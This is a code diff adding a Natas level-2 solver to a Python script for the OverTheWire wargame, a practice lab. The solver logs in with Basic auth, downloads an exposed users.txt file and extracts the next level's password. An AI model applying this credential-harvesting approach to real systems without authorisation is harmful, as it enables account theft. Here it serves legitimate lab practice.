@@ -5,6 +5,7 @@ import time
 import requests
 import base64
 import os
+import urllib2
 from bs4 import BeautifulSoup
 
 
@@ -58,6 +59,31 @@ def natas1(natas1Password):
     print('Password for next level is: ' + natas2Password)
     return(natas2Password)
 
+def natas2(natas2Password):
+    url = 'http://natas2.natas.labs.overthewire.org/files/users.txt'
+    username = 'natas2'
+    auth_64 = encodeCreds(username, natas2Password)
+    headers = {
+        'Authorization': 'Basic ' + auth_64
+    }
+    userToMatch = 'natas3'
+    userPassword = ''
+    print('[+] Logging into Natas 2 [+]')
+    fileContent = requests.get(url, allow_redirects=True, headers=headers)
+    open('natas2.txt', 'wb').write(fileContent.content)
+    with open('natas2.txt', 'r') as file:
+        for line in file:
+            if userToMatch in line:
+                userPassword = line.replace('natas3:', '')
+                break
+    print('Password for next level is: ' + userPassword)
+    os.remove('natas2.txt')
+    return(userPassword)
+
+def natas3(natas3Password):
+
+    return()
+
 def main():
     os.system('clear')
     print('[+] Cleaning flags.txt of old passwords [+]')
@@ -66,6 +92,8 @@ def main():
     writeToFlagFile(natas1Password, '1')
     natas2Password = natas1(natas1Password)
     writeToFlagFile(natas2Password, '2')
+    natas3Password = natas2(natas2Password)
+    writeToFlagFile(natas3Password, '3')
 
 
 if __name__ == "__main__":
